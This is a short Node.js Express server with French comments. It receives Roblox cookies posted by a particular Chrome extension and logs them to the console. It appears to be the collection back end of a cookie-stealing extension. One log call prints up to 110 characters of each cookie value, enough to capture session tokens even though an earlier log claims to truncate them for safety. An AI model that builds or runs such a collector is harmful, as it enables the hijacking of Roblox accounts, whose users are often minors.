const express = require("express");
const cors = require("cors");
const app = express();

// Remplace par l'ID de ton extension Chrome pour limiter l'accès
const ALLOWED_ORIGIN = "chrome-extension://bepinomhmhjfkfijfnkigboednbgggol";

app.use(cors({
  origin: ALLOWED_ORIGIN
}));

// Limite le body à 2MB et parse le JSON
app.use(express.json({ limit: "2mb" }));

// Route POST pour recevoir les cookies
app.post("/api/receive-cookies", (req, res) => {
  // Vérification de l'autorisation
  if (req.headers.authorization !== "Bearer SUPER_SECRET_TOKEN") {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const cookies = req.body;

  // Validation simple pour s'assurer que ce sont des cookies
  if (!Array.isArray(cookies)) {
    return res.status(400).json({ error: "Bad request: cookies should be an array" });
  }

  console.log("=== Cookies Roblox reçus ===");
  cookies.forEach(c => {
    // Log sécurisé: tronquer la valeur pour éviter d’exposer des tokens complets
    const valuePreview = c.value ? c.value.slice(0, 4) + "..." : "";
    console.log(`${c.name} = ${valuePreview} (HttpOnly: ${c.httpOnly}, Domain: ${c.domain})`);
  });

  // Optionnel: log plus structuré
  console.log("Cookies reçus :", cookies.map(c => ({
    name: c.name,
    value: c.value ? c.value.slice(0, 110) + "..." : "",
    httpOnly: c.httpOnly,
    domain: c.domain
  })));

  // Réponse JSON
  res.json({ ok: true, received: cookies.length });
});

// Démarrage du serveur
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Serveur en ligne sur le port ${PORT}`);
});
